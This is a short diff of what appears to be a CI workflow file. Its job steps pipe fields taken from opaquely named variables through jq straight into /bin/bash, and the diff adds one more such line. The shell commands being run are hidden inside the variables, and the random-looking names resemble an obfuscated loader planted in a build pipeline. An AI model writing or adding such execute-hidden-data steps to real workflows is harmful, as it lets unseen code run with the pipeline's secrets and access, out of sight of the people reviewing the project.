@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$mwem32" | jq -r .yu71 | /bin/bash
           echo $oaml90202 | jq -r .t119 | /bin/bash
           printf '%s' "$oqd566" | jq -r .uphq8 | /bin/bash
+          echo $hr8 | jq -r .pu6 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
